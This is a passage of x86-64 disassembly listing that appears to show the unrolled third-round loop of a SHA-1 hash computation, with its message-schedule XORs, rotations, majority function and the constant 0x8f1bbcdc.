  4053d9:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  4053e0:	48 8b 55 c0          	mov    -0x40(%rbp),%rdx
  4053e4:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  4053e8:	48 31 c2             	xor    %rax,%rdx
  4053eb:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  4053ef:	48 31 c2             	xor    %rax,%rdx
  4053f2:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4053f6:	48 31 d0             	xor    %rdx,%rax
  4053f9:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405400:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405407:	48 c1 e0 05          	shl    $0x5,%rax
  40540b:	48 89 c2             	mov    %rax,%rdx
  40540e:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405415:	89 c0                	mov    %eax,%eax
  405417:	48 c1 e8 1b          	shr    $0x1b,%rax
  40541b:	48 89 d1             	mov    %rdx,%rcx
  40541e:	48 09 c1             	or     %rax,%rcx
  405421:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405428:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  40542f:	48 89 d6             	mov    %rdx,%rsi
  405432:	48 21 c6             	and    %rax,%rsi
  405435:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  40543c:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  405443:	48 09 d0             	or     %rdx,%rax
  405446:	48 23 85 50 ff ff ff 	and    -0xb0(%rbp),%rax
  40544d:	48 09 f0             	or     %rsi,%rax
  405450:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  405454:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40545b:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  40545f:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405466:	89 c0                	mov    %eax,%eax
  405468:	48 c1 e8 1f          	shr    $0x1f,%rax
  40546c:	48 09 c8             	or     %rcx,%rax
  40546f:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
  405473:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  405477:	48 01 c2             	add    %rax,%rdx
  40547a:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405481:	48 01 c2             	add    %rax,%rdx
  405484:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  405489:	48 01 d0             	add    %rdx,%rax
  40548c:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  405493:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40549a:	48 c1 e0 1e          	shl    $0x1e,%rax
  40549e:	48 89 c2             	mov    %rax,%rdx
  4054a1:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4054a8:	89 c0                	mov    %eax,%eax
  4054aa:	48 c1 e8 02          	shr    $0x2,%rax
  4054ae:	48 09 d0             	or     %rdx,%rax
  4054b1:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  4054b8:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
  4054bc:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  4054c0:	48 31 c2             	xor    %rax,%rdx
  4054c3:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4054c7:	48 31 c2             	xor    %rax,%rdx
  4054ca:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  4054ce:	48 31 d0             	xor    %rdx,%rax
  4054d1:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  4054d8:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4054df:	48 c1 e0 05          	shl    $0x5,%rax
  4054e3:	48 89 c2             	mov    %rax,%rdx
  4054e6:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4054ed:	89 c0                	mov    %eax,%eax
  4054ef:	48 c1 e8 1b          	shr    $0x1b,%rax
  4054f3:	48 89 d1             	mov    %rdx,%rcx
  4054f6:	48 09 c1             	or     %rax,%rcx
  4054f9:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405500:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  405507:	48 89 d6             	mov    %rdx,%rsi
  40550a:	48 21 c6             	and    %rax,%rsi
  40550d:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405514:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  40551b:	48 09 d0             	or     %rdx,%rax
  40551e:	48 23 85 70 ff ff ff 	and    -0x90(%rbp),%rax
  405525:	48 09 f0             	or     %rsi,%rax
  405528:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  40552c:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405533:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  405537:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40553e:	89 c0                	mov    %eax,%eax
  405540:	48 c1 e8 1f          	shr    $0x1f,%rax
  405544:	48 09 c8             	or     %rcx,%rax
  405547:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  40554b:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  40554f:	48 01 c2             	add    %rax,%rdx
  405552:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405559:	48 01 c2             	add    %rax,%rdx
  40555c:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  405561:	48 01 d0             	add    %rdx,%rax
  405564:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  40556b:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405572:	48 c1 e0 1e          	shl    $0x1e,%rax
  405576:	48 89 c2             	mov    %rax,%rdx
  405579:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405580:	89 c0                	mov    %eax,%eax
  405582:	48 c1 e8 02          	shr    $0x2,%rax
  405586:	48 09 d0             	or     %rdx,%rax
  405589:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  405590:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
  405594:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  405598:	48 31 c2             	xor    %rax,%rdx
  40559b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40559f:	48 31 c2             	xor    %rax,%rdx
  4055a2:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  4055a6:	48 31 d0             	xor    %rdx,%rax
  4055a9:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  4055b0:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4055b7:	48 c1 e0 05          	shl    $0x5,%rax
  4055bb:	48 89 c2             	mov    %rax,%rdx
  4055be:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4055c5:	89 c0                	mov    %eax,%eax
  4055c7:	48 c1 e8 1b          	shr    $0x1b,%rax
  4055cb:	48 89 d1             	mov    %rdx,%rcx
  4055ce:	48 09 c1             	or     %rax,%rcx
  4055d1:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4055d8:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  4055df:	48 89 d6             	mov    %rdx,%rsi
  4055e2:	48 21 c6             	and    %rax,%rsi
  4055e5:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4055ec:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  4055f3:	48 09 d0             	or     %rdx,%rax
  4055f6:	48 23 85 68 ff ff ff 	and    -0x98(%rbp),%rax
  4055fd:	48 09 f0             	or     %rsi,%rax
  405600:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  405604:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40560b:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  40560f:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405616:	89 c0                	mov    %eax,%eax
  405618:	48 c1 e8 1f          	shr    $0x1f,%rax
  40561c:	48 09 c8             	or     %rcx,%rax
  40561f:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  405623:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  405627:	48 01 c2             	add    %rax,%rdx
  40562a:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405631:	48 01 c2             	add    %rax,%rdx
  405634:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  405639:	48 01 d0             	add    %rdx,%rax
  40563c:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  405643:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  40564a:	48 c1 e0 1e          	shl    $0x1e,%rax
  40564e:	48 89 c2             	mov    %rax,%rdx
  405651:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405658:	89 c0                	mov    %eax,%eax
  40565a:	48 c1 e8 02          	shr    $0x2,%rax
  40565e:	48 09 d0             	or     %rdx,%rax
  405661:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  405668:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  40566c:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  405670:	48 31 c2             	xor    %rax,%rdx
  405673:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  405677:	48 31 c2             	xor    %rax,%rdx
  40567a:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  40567e:	48 31 d0             	xor    %rdx,%rax
  405681:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405688:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  40568f:	48 c1 e0 05          	shl    $0x5,%rax
  405693:	48 89 c2             	mov    %rax,%rdx
  405696:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  40569d:	89 c0                	mov    %eax,%eax
  40569f:	48 c1 e8 1b          	shr    $0x1b,%rax
  4056a3:	48 89 d1             	mov    %rdx,%rcx
  4056a6:	48 09 c1             	or     %rax,%rcx
  4056a9:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4056b0:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  4056b7:	48 89 d6             	mov    %rdx,%rsi
  4056ba:	48 21 c6             	and    %rax,%rsi
  4056bd:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4056c4:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  4056cb:	48 09 d0             	or     %rdx,%rax
  4056ce:	48 23 85 60 ff ff ff 	and    -0xa0(%rbp),%rax
  4056d5:	48 09 f0             	or     %rsi,%rax
  4056d8:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4056dc:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4056e3:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  4056e7:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4056ee:	89 c0                	mov    %eax,%eax
  4056f0:	48 c1 e8 1f          	shr    $0x1f,%rax
  4056f4:	48 09 c8             	or     %rcx,%rax
  4056f7:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  4056fb:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4056ff:	48 01 c2             	add    %rax,%rdx
  405702:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405709:	48 01 c2             	add    %rax,%rdx
  40570c:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  405711:	48 01 d0             	add    %rdx,%rax
  405714:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  40571b:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405722:	48 c1 e0 1e          	shl    $0x1e,%rax
  405726:	48 89 c2             	mov    %rax,%rdx
  405729:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405730:	89 c0                	mov    %eax,%eax
  405732:	48 c1 e8 02          	shr    $0x2,%rax
  405736:	48 09 d0             	or     %rdx,%rax
  405739:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  405740:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
  405744:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  405748:	48 31 c2             	xor    %rax,%rdx
  40574b:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  40574f:	48 31 c2             	xor    %rax,%rdx
  405752:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  405756:	48 31 d0             	xor    %rdx,%rax
  405759:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405760:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405767:	48 c1 e0 05          	shl    $0x5,%rax
  40576b:	48 89 c2             	mov    %rax,%rdx
  40576e:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405775:	89 c0                	mov    %eax,%eax
  405777:	48 c1 e8 1b          	shr    $0x1b,%rax
  40577b:	48 89 d1             	mov    %rdx,%rcx
  40577e:	48 09 c1             	or     %rax,%rcx
  405781:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405788:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  40578f:	48 89 d6             	mov    %rdx,%rsi
  405792:	48 21 c6             	and    %rax,%rsi
  405795:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  40579c:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  4057a3:	48 09 d0             	or     %rdx,%rax
  4057a6:	48 23 85 58 ff ff ff 	and    -0xa8(%rbp),%rax
  4057ad:	48 09 f0             	or     %rsi,%rax
  4057b0:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4057b4:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4057bb:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  4057bf:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4057c6:	89 c0                	mov    %eax,%eax
  4057c8:	48 c1 e8 1f          	shr    $0x1f,%rax
  4057cc:	48 09 c8             	or     %rcx,%rax
  4057cf:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4057d3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4057d7:	48 01 c2             	add    %rax,%rdx
  4057da:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4057e1:	48 01 c2             	add    %rax,%rdx
  4057e4:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  4057e9:	48 01 d0             	add    %rdx,%rax
  4057ec:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  4057f3:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4057fa:	48 c1 e0 1e          	shl    $0x1e,%rax
  4057fe:	48 89 c2             	mov    %rax,%rdx
  405801:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405808:	89 c0                	mov    %eax,%eax
  40580a:	48 c1 e8 02          	shr    $0x2,%rax
  40580e:	48 09 d0             	or     %rdx,%rax
  405811:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  405818:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
  40581c:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  405820:	48 31 c2             	xor    %rax,%rdx
  405823:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  405827:	48 31 c2             	xor    %rax,%rdx
  40582a:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  40582e:	48 31 d0             	xor    %rdx,%rax
  405831:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405838:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40583f:	48 c1 e0 05          	shl    $0x5,%rax
  405843:	48 89 c2             	mov    %rax,%rdx
  405846:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40584d:	89 c0                	mov    %eax,%eax
  40584f:	48 c1 e8 1b          	shr    $0x1b,%rax
  405853:	48 89 d1             	mov    %rdx,%rcx
  405856:	48 09 c1             	or     %rax,%rcx
  405859:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405860:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  405867:	48 89 d6             	mov    %rdx,%rsi
  40586a:	48 21 c6             	and    %rax,%rsi
  40586d:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405874:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  40587b:	48 09 d0             	or     %rdx,%rax
  40587e:	48 23 85 50 ff ff ff 	and    -0xb0(%rbp),%rax
  405885:	48 09 f0             	or     %rsi,%rax
  405888:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  40588c:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405893:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  405897:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40589e:	89 c0                	mov    %eax,%eax
  4058a0:	48 c1 e8 1f          	shr    $0x1f,%rax
  4058a4:	48 09 c8             	or     %rcx,%rax
  4058a7:	48 89 45 80          	mov    %rax,-0x80(%rbp)
  4058ab:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  4058af:	48 01 c2             	add    %rax,%rdx
  4058b2:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4058b9:	48 01 c2             	add    %rax,%rdx
  4058bc:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  4058c1:	48 01 d0             	add    %rdx,%rax
  4058c4:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  4058cb:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4058d2:	48 c1 e0 1e          	shl    $0x1e,%rax
  4058d6:	48 89 c2             	mov    %rax,%rdx
  4058d9:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4058e0:	89 c0                	mov    %eax,%eax
  4058e2:	48 c1 e8 02          	shr    $0x2,%rax
  4058e6:	48 09 d0             	or     %rdx,%rax
  4058e9:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  4058f0:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
  4058f4:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4058f8:	48 31 c2             	xor    %rax,%rdx
  4058fb:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  4058ff:	48 31 c2             	xor    %rax,%rdx
  405902:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  405906:	48 31 d0             	xor    %rdx,%rax
  405909:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405910:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405917:	48 c1 e0 05          	shl    $0x5,%rax
  40591b:	48 89 c2             	mov    %rax,%rdx
  40591e:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405925:	89 c0                	mov    %eax,%eax
  405927:	48 c1 e8 1b          	shr    $0x1b,%rax
  40592b:	48 89 d1             	mov    %rdx,%rcx
  40592e:	48 09 c1             	or     %rax,%rcx
  405931:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405938:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  40593f:	48 89 d6             	mov    %rdx,%rsi
  405942:	48 21 c6             	and    %rax,%rsi
  405945:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40594c:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  405953:	48 09 d0             	or     %rdx,%rax
  405956:	48 23 85 70 ff ff ff 	and    -0x90(%rbp),%rax
  40595d:	48 09 f0             	or     %rsi,%rax
  405960:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  405964:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40596b:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  40596f:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405976:	89 c0                	mov    %eax,%eax
  405978:	48 c1 e8 1f          	shr    $0x1f,%rax
  40597c:	48 09 c8             	or     %rcx,%rax
  40597f:	48 89 45 88          	mov    %rax,-0x78(%rbp)
  405983:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  405987:	48 01 c2             	add    %rax,%rdx
  40598a:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405991:	48 01 c2             	add    %rax,%rdx
  405994:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  405999:	48 01 d0             	add    %rdx,%rax
  40599c:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  4059a3:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4059aa:	48 c1 e0 1e          	shl    $0x1e,%rax
  4059ae:	48 89 c2             	mov    %rax,%rdx
  4059b1:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4059b8:	89 c0                	mov    %eax,%eax
  4059ba:	48 c1 e8 02          	shr    $0x2,%rax
  4059be:	48 09 d0             	or     %rdx,%rax
  4059c1:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  4059c8:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
  4059cc:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  4059d0:	48 31 c2             	xor    %rax,%rdx
  4059d3:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  4059d7:	48 31 c2             	xor    %rax,%rdx
  4059da:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  4059de:	48 31 d0             	xor    %rdx,%rax
  4059e1:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  4059e8:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4059ef:	48 c1 e0 05          	shl    $0x5,%rax
  4059f3:	48 89 c2             	mov    %rax,%rdx
  4059f6:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4059fd:	89 c0                	mov    %eax,%eax
  4059ff:	48 c1 e8 1b          	shr    $0x1b,%rax
  405a03:	48 89 d1             	mov    %rdx,%rcx
  405a06:	48 09 c1             	or     %rax,%rcx
  405a09:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405a10:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  405a17:	48 89 d6             	mov    %rdx,%rsi
  405a1a:	48 21 c6             	and    %rax,%rsi
  405a1d:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405a24:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  405a2b:	48 09 d0             	or     %rdx,%rax
  405a2e:	48 23 85 68 ff ff ff 	and    -0x98(%rbp),%rax
  405a35:	48 09 f0             	or     %rsi,%rax
  405a38:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  405a3c:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405a43:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  405a47:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405a4e:	89 c0                	mov    %eax,%eax
  405a50:	48 c1 e8 1f          	shr    $0x1f,%rax
  405a54:	48 09 c8             	or     %rcx,%rax
  405a57:	48 89 45 90          	mov    %rax,-0x70(%rbp)
  405a5b:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  405a5f:	48 01 c2             	add    %rax,%rdx
  405a62:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405a69:	48 01 c2             	add    %rax,%rdx
  405a6c:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  405a71:	48 01 d0             	add    %rdx,%rax
  405a74:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  405a7b:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405a82:	48 c1 e0 1e          	shl    $0x1e,%rax
  405a86:	48 89 c2             	mov    %rax,%rdx
  405a89:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405a90:	89 c0                	mov    %eax,%eax
  405a92:	48 c1 e8 02          	shr    $0x2,%rax
  405a96:	48 09 d0             	or     %rdx,%rax
  405a99:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  405aa0:	48 8b 55 80          	mov    -0x80(%rbp),%rdx
  405aa4:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  405aa8:	48 31 c2             	xor    %rax,%rdx
  405aab:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  405aaf:	48 31 c2             	xor    %rax,%rdx
  405ab2:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  405ab6:	48 31 d0             	xor    %rdx,%rax
  405ab9:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405ac0:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405ac7:	48 c1 e0 05          	shl    $0x5,%rax
  405acb:	48 89 c2             	mov    %rax,%rdx
  405ace:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405ad5:	89 c0                	mov    %eax,%eax
  405ad7:	48 c1 e8 1b          	shr    $0x1b,%rax
  405adb:	48 89 d1             	mov    %rdx,%rcx
  405ade:	48 09 c1             	or     %rax,%rcx
  405ae1:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405ae8:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  405aef:	48 89 d6             	mov    %rdx,%rsi
  405af2:	48 21 c6             	and    %rax,%rsi
  405af5:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405afc:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  405b03:	48 09 d0             	or     %rdx,%rax
  405b06:	48 23 85 60 ff ff ff 	and    -0xa0(%rbp),%rax
  405b0d:	48 09 f0             	or     %rsi,%rax
  405b10:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  405b14:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405b1b:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  405b1f:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405b26:	89 c0                	mov    %eax,%eax
  405b28:	48 c1 e8 1f          	shr    $0x1f,%rax
  405b2c:	48 09 c8             	or     %rcx,%rax
  405b2f:	48 89 45 98          	mov    %rax,-0x68(%rbp)
  405b33:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  405b37:	48 01 c2             	add    %rax,%rdx
  405b3a:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405b41:	48 01 c2             	add    %rax,%rdx
  405b44:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  405b49:	48 01 d0             	add    %rdx,%rax
  405b4c:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  405b53:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405b5a:	48 c1 e0 1e          	shl    $0x1e,%rax
  405b5e:	48 89 c2             	mov    %rax,%rdx
  405b61:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405b68:	89 c0                	mov    %eax,%eax
  405b6a:	48 c1 e8 02          	shr    $0x2,%rax
  405b6e:	48 09 d0             	or     %rdx,%rax
  405b71:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  405b78:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
  405b7c:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  405b80:	48 31 c2             	xor    %rax,%rdx
  405b83:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  405b87:	48 31 c2             	xor    %rax,%rdx
  405b8a:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  405b8e:	48 31 d0             	xor    %rdx,%rax
  405b91:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405b98:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405b9f:	48 c1 e0 05          	shl    $0x5,%rax
  405ba3:	48 89 c2             	mov    %rax,%rdx
  405ba6:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405bad:	89 c0                	mov    %eax,%eax
  405baf:	48 c1 e8 1b          	shr    $0x1b,%rax
  405bb3:	48 89 d1             	mov    %rdx,%rcx
  405bb6:	48 09 c1             	or     %rax,%rcx
  405bb9:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405bc0:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  405bc7:	48 89 d6             	mov    %rdx,%rsi
  405bca:	48 21 c6             	and    %rax,%rsi
  405bcd:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405bd4:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  405bdb:	48 09 d0             	or     %rdx,%rax
  405bde:	48 23 85 58 ff ff ff 	and    -0xa8(%rbp),%rax
  405be5:	48 09 f0             	or     %rsi,%rax
  405be8:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  405bec:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405bf3:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
